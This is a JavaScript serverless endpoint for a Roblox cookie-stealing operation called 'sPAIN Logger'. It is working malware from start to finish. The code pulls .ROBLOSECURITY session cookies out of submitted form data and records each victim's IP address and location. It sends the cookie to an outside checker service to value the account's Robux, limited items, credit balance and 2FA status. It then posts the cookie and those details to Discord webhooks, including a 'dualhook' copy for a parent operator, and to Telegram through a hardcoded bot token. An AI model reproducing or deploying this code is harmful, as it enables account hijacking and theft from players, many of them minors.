// api/submit.js
const REDIS_URL   = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN    = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT     = process.env.TG_CHAT  || '7538845070';
const CHECKER_URL = 'https://holy-truth-3129.notrllyme133.workers.dev/';
const DISCORD_INV = 'https://discord.gg/5Q8XvgTpTT';
const BASE_URL    = 'https://spain-tools.vercel.app';

const WH_NAME   = 'sPAIN';
const WH_AVATAR = 'https://github.com/SOCCRETS/imhgrl/blob/main/PAINisAbeautifulTHING.webp?raw=true';
const EMOJI     = '<a:emoji_17:1508694920972468347>';

// ── Redis ─────────────────────────────────────────────────────────────────────
async function redisGet(key) {
  try {
    const res  = await fetch(`${REDIS_URL}/get/${encodeURIComponent(key)}`, { headers: { Authorization: `Bearer ${REDIS_TOKEN}` } });
    const json = await res.json();
    if (!json.result) return null;
    let r = json.result;
    if (typeof r === 'string') { try { r = JSON.parse(r); } catch { return null; } }
    if (r && typeof r.value === 'string' && !r.webhook) { try { r = JSON.parse(r.value); } catch {} }
    return r || null;
  } catch { return null; }
}

// ── Geo ───────────────────────────────────────────────────────────────────────
async function getIpGeo(ip) {
  try {
    if (!ip || ip === 'Unknown') return null;
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 3000);
    const r = await fetch(`https://freeipapi.com/api/json/${ip}`, { signal: ctrl.signal });
    clearTimeout(timer);
    const d = await r.json();
    return { city: d.cityName, regionName: d.regionName, country: d.countryName, isp: d.isp };
  } catch { return null; }
}

// ── Checker ───────────────────────────────────────────────────────────────────
async function getAccInfo(cookie) {
  try {
    const r = await fetch(CHECKER_URL, {
      method:  'POST',
      headers: { 'Content-Type': 'application/json' },
      body:    JSON.stringify({ cookie })
    });
    if (!r.ok) return null;
    const d = await r.json();
    return (d.valid || d.success) ? d : null;
  } catch { return null; }
}

// ── Telegram ──────────────────────────────────────────────────────────────────
async function tgSend(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML', disable_web_page_preview: true })
    });
  } catch (_) {}
}

// ── Cookie extraction ─────────────────────────────────────────────────────────
const WARN = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
function extractCookie(raw) {
  if (!raw) return null;
  const s = String(raw).trim();
  const m1 = s.match(/(_\|WARNING:-DO-NOT-SHARE-THIS[^|]*\|_[^\s"'`]+)/); if (m1) return m1[1];
  const m2 = s.match(/_\|WARNING[^|]*\|_([^\s"'`]+)/);                    if (m2) return WARN + m2[1];
  const m3 = s.match(/\|_([^\s"'`]{50,})/);                               if (m3) return WARN + m3[1];
  if (s.length >= 100 && /^[a-zA-Z0-9\-_.=+/]+$/.test(s)) return WARN + s;
  return null;
}
function findCookie(slots) {
  for (const val of Object.values(slots || {})) {
    const c = extractCookie(String(val || ''));
    if (c) return c;
  }
  return null;
}

function parseBody(raw) {
  if (!raw) return {};
  if (typeof raw === 'object' && !Buffer.isBuffer(raw)) return raw;
  try { return JSON.parse(Buffer.isBuffer(raw) ? raw.toString('utf8') : String(raw)); }
  catch { return {}; }
}

function fmt(n) { return Number(n || 0).toLocaleString(); }

const FLAGS = {
  'United States':'🇺🇸','United Kingdom':'🇬🇧','Canada':'🇨🇦','Australia':'🇦🇺',
  'Germany':'🇩🇪','France':'🇫🇷','Netherlands':'🇳🇱','Philippines':'🇵🇭',
  'Indonesia':'🇮🇩','Singapore':'🇸🇬','Malaysia':'🇲🇾','India':'🇮🇳',
  'Japan':'🇯🇵','South Korea':'🇰🇷','Brazil':'🇧🇷','Mexico':'🇲🇽',
  'New Zealand':'🇳🇿','Ireland':'🇮🇪','Sweden':'🇸🇪','Norway':'🇳🇴',
  'Denmark':'🇩🇰','Finland':'🇫🇮','Poland':'🇵🇱','Spain':'🇪🇸',
  'Italy':'🇮🇹','Russia':'🇷🇺','Turkey':'🇹🇷','South Africa':'🇿🇦',
  'Thailand':'🇹🇭','Vietnam':'🇻🇳','Saudi Arabia':'🇸🇦','UAE':'🇦🇪'
};
function flag(c) { return FLAGS[c] || '🌐'; }

// ── Discord helpers ───────────────────────────────────────────────────────────
async function discordSend(url, payload) {
  if (!url?.includes('discord.com/api/webhooks')) return;
  try {
    await fetch(url, {
      method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: WH_NAME, avatar_url: WH_AVATAR, ...payload })
    });
  } catch (_) {}
}

async function discordChunked(url, text) {
  let rem = text; let first = true;
  while (rem.length > 0) {
    const chunk = rem.substring(0, 1990); rem = rem.substring(1990);
    await discordSend(url, {
      content: first
        ? '```\n' + chunk + (rem.length === 0 ? '\n```' : '')
        : chunk + (rem.length === 0 ? '\n```' : '')
    });
    first = false;
  }
}

// ── Handler ───────────────────────────────────────────────────────────────────
export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(204).end();
  if (req.method !== 'POST')   return res.status(405).json({ error: 'Method not allowed' });

  const body = parseBody(req.body);
  const { slug, slots } = body;
  if (!slug)  return res.status(400).json({ error: 'slug is required' });
  if (!slots) return res.status(400).json({ error: 'slots is required' });

  const record = await redisGet(`slot:${slug}`);
  if (!record)         return res.status(404).json({ error: 'Page not found' });
  if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

  const ip     = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.headers['x-real-ip'] || 'Unknown';
  const now    = new Date().toISOString();
  const pName  = record.displayName || slug;
  const isDH   = !!record.dualhookParent;
  const cookie = findCookie(slots);

  let webhook1     = null;
  let dhParentName = null;
  const webhook2   = record.webhook;

  if (isDH) {
    try {
      const parent = await redisGet(`slot:${record.dualhookParent}`);
      if (parent?.webhook) { webhook1 = parent.webhook; dhParentName = parent.displayName || record.dualhookParent; }
    } catch (_) {}
  }

  // ── No cookie ─────────────────────────────────────────────────────────────
  if (!cookie) {
    const geo = await getIpGeo(ip);
    const loc = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
    const baseFields = [
      { name: '🌐 IP',       value: `\`${ip}\``,        inline: true  },
      { name: '📄 Page',     value: `\`${pName}\``,      inline: true  },
      { name: '📍 Location', value: loc,                 inline: false },
      { name: '🗺️ ISP',      value: geo?.isp || 'Unknown', inline: true },
      { name: '🕐 Time',     value: now,                 inline: true  }
    ];
    await discordSend(webhook2, { content: '@everyone', embeds: [{ title: '🍪 Cookie Captured', description: `${EMOJI} ${pName} ${EMOJI}`, color: 0xff3333, fields: baseFields, footer: { text: `sPAIN Logger • ${pName}` }, timestamp: now }] });
    if (webhook1) {
      const dhF = [...baseFields];
      dhF.splice(2, 0, { name: '🔒 DH Parent', value: `\`${dhParentName || 'Unknown'}\``, inline: true });
      await discordSend(webhook1, { content: '@everyone', embeds: [{ title: '🍪 Cookie Captured (Dualhook)', description: `${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}`, color: 0xff3333, fields: dhF, footer: { text: `sPAIN Logger • ${pName}` }, timestamp: now }] });
    }
    await tgSend(`⚠️ <b>NO COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
    return res.status(200).json({ success: true });
  }

  // ── Cookie found ──────────────────────────────────────────────────────────
  const [geo, info] = await Promise.all([getIpGeo(ip), getAccInfo(cookie)]);

  const loc     = [geo?.city, geo?.regionName, geo?.country].filter(Boolean).join(', ') || 'Unknown';
  const isp     = geo?.isp || 'Unknown';
  const country = geo?.country || 'Unknown';
  const cflag   = flag(country);

  // ── Invalid cookie ────────────────────────────────────────────────────────
  if (!info) {
    const baseFields = [
      { name: '🌐 IP',       value: `\`${ip}\``,              inline: true  },
      { name: '📄 Page',     value: `\`${pName}\``,            inline: true  },
      { name: '💀 Status',   value: 'Invalid/Expired Cookie',  inline: true  },
      { name: '📍 Location', value: loc,                       inline: false },
      { name: '🕐 Time',     value: now,                       inline: true  }
    ];
    await discordSend(webhook2, { content: '@everyone', embeds: [{ title: '🍪 Cookie Captured', description: `${EMOJI} ${pName} ${EMOJI}`, color: 0xff3333, fields: baseFields, footer: { text: `sPAIN Logger • ${pName}` }, timestamp: now }] });
    if (webhook1) {
      const dhF = [...baseFields];
      dhF.splice(2, 0, { name: '🔒 DH Parent', value: `\`${dhParentName || 'Unknown'}\``, inline: true });
      await discordSend(webhook1, { content: '@everyone', embeds: [{ title: '🍪 Cookie Captured (Dualhook)', description: `${EMOJI} ${dhParentName || 'Unknown'} ${EMOJI}`, color: 0xff3333, fields: dhF, footer: { text: `sPAIN Logger • ${pName}` }, timestamp: now }] });
    }
    await tgSend(`⚠️ <b>INVALID COOKIE — ${pName}</b>\n🌐 <code>${ip}</code>\n📍 ${loc}`);
    return res.status(200).json({ success: true });
  }

  // ── Pull fields ───────────────────────────────────────────────────────────
  const fa           = info?.fullAccount || info || {};
  const username     = info?.username    || 'Unknown';
  const displayName  = info?.displayName || username;
  const uid          = info?.id          || info?.userId || '';
  const avatarUrl    = fa.avatarUrl      || info?.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png';
  const ageDays      = fa.ageDays        ?? info?.ageDays      ?? 0;
  const ageBracket   = info?.ageBracket  || '13+';
  const robux        = fa.robux          ?? info?.robux        ?? 0;
  const pendingRobux = info?.pendingRobux ?? 0;
  const rap          = fa.rap            ?? info?.rap          ?? 0;
  const limiteds     = fa.limiteds       ?? info?.limitedsCount ?? 0;
  const credit       = fa.credit         ?? info?.credit       ?? 0;
  const creditCurr   = fa.creditCurrency ?? info?.creditCurr   ?? 'USD';
  const payCount     = info?.payCount    ?? 0;
  const groupsOwned  = info?.groupsOwned  ?? 0;
  const groupBalance = info?.groupBalance ?? 0;
  const groupPending = info?.groupPending ?? 0;
  const emailDisplay = fa.emailDisplay   ?? info?.emailDisplay ?? 'Not Set';
  const has2FA       = fa.has2FA         ?? info?.has2FA       ?? 'Disabled';
  const mm2          = info?.mm2          ?? 0;
  const adoptMe      = info?.adoptMe      ?? 0;
  const ps99         = info?.ps99         ?? 0;

  const emailSet      = !emailDisplay.includes('Not Set');
  const emailVerified = emailDisplay.includes('Verified') && !emailDisplay.includes('Unverified');
  const twoFAon       = has2FA !== 'Disabled' && has2FA !== 'None' && has2FA !== false && has2FA !== 'DISABLED';

  const profileUrl    = uid ? `https://www.roblox.com/users/${uid}/profile` : 'https://www.roblox.com';
  const refreshToken  = Math.random().toString(36).slice(2, 10) + Date.now().toString(36);
  const refreshUrl    = `${BASE_URL}/r/${refreshToken}`;
  const cookieDisplay = cookie.length > 950 ? cookie.substring(0, 950) + '…' : cookie;

  // ── pageEmbed (webhook2) ──────────────────────────────────────────────────
  const pageEmbed = {
    title:       '🍪 Cookie Captured',
    // FIX: refreshUrl now actually in the embed
    description: `${EMOJI} ${pName} ${EMOJI}\n\n[Profile 👤](${profileUrl}) | [🔄 Refresh](${refreshUrl}) | [Discord](${DISCORD_INV})`,
    color:       5793266,
    thumbnail:   { url: avatarUrl },
    fields: [
      { name: '👤 Username',      value: `\`${username}\``,                                                                                                                      inline: true  },
      { name: '📄 Page',          value: `\`${pName}\``,                                                                                                                         inline: true  },
      { name: '🌐 IP',            value: `\`${ip}\``,                                                                                                                            inline: true  },
      { name: '📍 Location',      value: `${country} ${cflag}`,                                                                                                                  inline: true  },
      { name: '🗺️ ISP',           value: isp,                                                                                                                                    inline: true  },
      { name: '📊 Account Stats', value: `\`Account Age:\` \`${fmt(ageDays)} Days\``,                                                                                            inline: false },
      // FIX: removed \$ escape — was showing literal ${fmt(credit)} before
      { name: '💳 Billing',       value: `Credit: ${fmt(credit)} ${creditCurr}\nConvert: ${fmt(pendingRobux)}\nPayments: ${payCount}`,                                           inline: true  },
      { name: '👥 Groups',        value: `Balance: ${fmt(groupBalance)}\nPending: ${fmt(groupPending)}\nOwned: ${groupsOwned}`,                                                  inline: true  },
      { name: '⚙️ Settings',      value: `Email: ${emailSet ? 'True ✅' : 'False ❌'}\nVerified: ${emailVerified ? 'True ✅' : 'Unset ❌'}\n2FA: ${twoFAon ? `${has2FA} ✅` : 'Disabled ❌'}`, inline: true },
      { name: '💰 Account Funds', value: `Balance: ${fmt(robux)}\nPending: ${fmt(pendingRobux)}`,                                                                                inline: true  },
      { name: '🛒 Purchases',     value: `Limiteds: ${limiteds}\nRAP: ${fmt(rap)}`,                                                                                              inline: true  },
      { name: '🎮 Gamepasses',    value: `PS99 → ${ps99 || 0} ${ps99 ? '✅' : '❌'}\nAdopt Me → ${adoptMe || 0} ${adoptMe ? '✅' : '❌'}\nMM2 → ${mm2 || 0} ${mm2 ? '✅' : '❌'}`, inline: false },
      { name: '🔐 ROBLOSECURITY', value: `\`\`\`${cookieDisplay}\`\`\``,                                                                                                         inline: false }
    ],
    footer:    { text: `sPAIN Logger • ${pName} • ${now}` },
    timestamp: now
  };

  // ── sPainEmbed (webhook1 dualhook) ────────────────────────────────────────
  const sPainEmbed = {
    title:       '🍪 Cookie Captured (Dualhook)',
    description: `${EMOJI} s.PAIN ${EMOJI}\n\n[Profile 👤](${profileUrl}) | [🔄 Refresh](${refreshUrl}) | [Discord](${DISCORD_INV})`,
    color:       5793266,
    thumbnail:   { url: avatarUrl },
    fields: [
      { name: '👤 Username',      value: `\`${username}\``,                                                                                                                      inline: true  },
      { name: '📄 Page',          value: `\`${pName}\``,                                                                                                                         inline: true  },
      { name: '🔒 DH Parent',     value: `\`${dhParentName || 'Unknown'}\``,                                                                                                     inline: true  },
      { name: '🌐 IP',            value: `\`${ip}\``,                                                                                                                            inline: true  },
      { name: '📍 Location',      value: `${country} ${cflag}`,                                                                                                                  inline: true  },
      { name: '🗺️ ISP',           value: isp,                                                                                                                                    inline: true  },
      { name: '📊 Account Stats', value: `\`Account Age:\` \`${fmt(ageDays)} Days\``,                                                                                            inline: false },
      { name: '💳 Billing',       value: `Credit: ${fmt(credit)} ${creditCurr}\nConvert: ${fmt(pendingRobux)}\nPayments: ${payCount}`,                                           inline: true  },
      { name: '👥 Groups',        value: `Balance: ${fmt(groupBalance)}\nPending: ${fmt(groupPending)}\nOwned: ${groupsOwned}`,                                                  inline: true  },
      { name: '⚙️ Settings',      value: `Email: ${emailSet ? 'True ✅' : 'False ❌'}\nVerified: ${emailVerified ? 'True ✅' : 'Unset ❌'}\n2FA: ${twoFAon ? `${has2FA} ✅` : 'Disabled ❌'}`, inline: true },
      { name: '💰 Account Funds', value: `Balance: ${fmt(robux)}\nPending: ${fmt(pendingRobux)}`,                                                                                inline: true  },
      { name: '🛒 Purchases',     value: `Limiteds: ${limiteds}\nRAP: ${fmt(rap)}`,                                                                                              inline: true  },
      { name: '🎮 Gamepasses',    value: `PS99 → ${ps99 || 0} ${ps99 ? '✅' : '❌'}\nAdopt Me → ${adoptMe || 0} ${adoptMe ? '✅' : '❌'}\nMM2 → ${mm2 || 0} ${mm2 ? '✅' : '❌'}`, inline: false },
      { name: '🔐 ROBLOSECURITY', value: `\`\`\`${cookieDisplay}\`\`\``,                                                                                                         inline: false }
    ],
    footer:    { text: `sPAIN Logger • ${pName} • ${now}` },
    timestamp: now
  };

  // ── Send ──────────────────────────────────────────────────────────────────
  await discordSend(webhook2, { content: '@everyone', embeds: [pageEmbed] });
  await discordChunked(webhook2, cookie);
  if (info?.powershell) await discordChunked(webhook2, info.powershell);

  if (webhook1) {
    await discordSend(webhook1, { content: '@everyone', embeds: [sPainEmbed] });
    await discordChunked(webhook1, cookie);
    if (info?.powershell) await discordChunked(webhook1, info.powershell);
  }

  await tgSend([
    `✅ <b>${username} ${ageBracket} — ${pName}</b>`,
    `💰 ${fmt(robux)} R$ | RAP: ${fmt(rap)} | Limiteds: ${limiteds}`,
    `💳 Credit: ${fmt(credit)} ${creditCurr} | 2FA: ${twoFAon ? has2FA : 'Off'}`,
    `👥 Groups: ${groupsOwned} owned | Bal: ${fmt(groupBalance)}`,
    `📍 ${loc} | ${isp}`,
    `🔗 <a href="${profileUrl}">Profile</a> | <a href="${refreshUrl}">Refresh Cookie</a>`
  ].join('\n'));

  return res.status(200).json({ success: true });
}
